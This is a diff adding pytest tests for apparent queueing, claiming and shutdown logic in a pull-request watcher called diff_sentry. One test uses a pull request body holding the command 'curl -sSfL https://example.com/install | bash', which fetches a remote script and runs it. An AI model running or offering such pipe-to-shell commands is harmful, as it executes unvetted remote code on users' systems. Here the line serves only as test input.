@@ -347,6 +347,75 @@ def test_shedding_is_written_with_the_change_that_takes_its_place(make):
     assert w.state.queue_size() == 2
 
 
+def test_an_admission_does_not_shed_a_run_claimed_after_the_victim_was_selected(make, monkeypatch):
+    w = make.make(quick_runner, 1, workers=2, max_queue=1)
+    admit = w._admit
+
+    def admit_then_claim(*args):
+        decision = admit(*args)
+        assert decision[2] == "acme__widgets-pr-1"
+        assert w._claim() is not None
+        return decision
+
+    monkeypatch.setattr(w, "_admit", admit_then_claim)
+    make.world.pr("acme/widgets", 3, body="curl -sSfL https://example.com/install | bash")
+    report = w.poll_once()
+    assert report.errors == [] and report.shed == 0 and report.queued == 1
+    assert w.state.has_run("acme__widgets-pr-1")
+    assert w.state.change("acme/widgets", "pull_request", 1)["state"] == "running"
+
+
+def test_stopping_after_claim_before_pool_submit_gives_back_the_attempt(make, monkeypatch):
+    w = make.make(quick_runner, 1, workers=2)
+    claim = w._claim
+
+    def claim_then_stop():
+        claimed = claim()
+        w.stop()
+        return claimed
+
+    def unexpected_submit(*args):
+        pytest.fail("submitted a model run after stop")
+
+    monkeypatch.setattr(w, "_claim", claim_then_stop)
+    assert w._pump(SimpleNamespace(submit=unexpected_submit), {}, None) == (0, False)
+    assert w.state.change("acme/widgets", "pull_request", 1)["state"] == "queued"
+    row = w.state.claim(make.clock.now)
+    assert row is not None and row["attempts"] == 0
+    assert w.state.deep_last_hour(make.clock.now) == []
+
+
+def test_stop_during_pool_wait_keeps_interruptions_and_settles_received_outcomes(make, monkeypatch):
+    from concurrent.futures import Future
+    from concurrent.futures.process import BrokenProcessPool
+
+    from diff_sentry import watch
+
+    w = make.make(quick_runner, 2, workers=2)
+    interrupted, finished = Future(), Future()
+    futures = iter((interrupted, finished))
+
+    def wait_then_stop(*args, **kwargs):
+        w.stop()
+        interrupted.set_exception(BrokenProcessPool())
+        return {interrupted}, {finished}
+
+    def shutdown(**kwargs):
+        finished.set_result(("benign", False, "info"))
+
+    pool = SimpleNamespace(submit=lambda *args: next(futures), shutdown=shutdown)
+    monkeypatch.setattr(w, "_new_pool", lambda: pool)
+    monkeypatch.setattr(watch, "wait", wait_then_stop)
+    assert w.drain() == 2
+    assert w.state.stats()["states"] == {"running": 1, "done": 1}
+    w.close()
+
+    again = make.make(quick_runner, 0, workers=1)
+    again.recover()
+    assert again.state.stats()["states"] == {"queued": 1, "done": 1}
+    assert again.drain() == 1
+
+
 def test_the_pool_claims_nothing_of_a_paused_repository(make):
     w = make.make(quick_runner, 2, workers=2)
     w.close()
